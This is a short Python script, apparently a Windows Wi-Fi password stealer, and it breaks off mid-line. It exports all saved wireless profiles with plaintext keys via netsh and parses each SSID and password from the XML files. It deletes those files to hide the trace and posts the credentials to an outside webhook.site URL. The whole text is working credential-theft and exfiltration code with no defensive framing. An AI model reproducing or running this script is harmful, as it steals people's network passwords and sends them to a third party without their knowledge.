import subprocess, os, sys, requests
import xml.etree.ElementTree as ET

url = 'https://webhook.site/91b8895e-2757-4a25-bbc4-e752de3364ba'

wifi_files = []
payload = {'SSID': [], 'Password': []}

command = subprocess.run(['netsh', 'wlan', 'export profile', 'key=clear'], capture_output=True).stdout.decode()

path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith('WLAN') and filename.endswith('.xml'):
        wifi_files.append(filename)

for file in wifi_files:
    tree = ET.parse(file)
    root = tree.getroot()
    SSID = root[0].text
    password = root[4][0][1][2].text
    payload['SSID'].append(SSID)
    payload['Password'].append(password)
    os.remove(file)



payload_str = " & ".join("%s=%s" % (k,v) for k,v in payload.items())
r = requests.post(url, params='for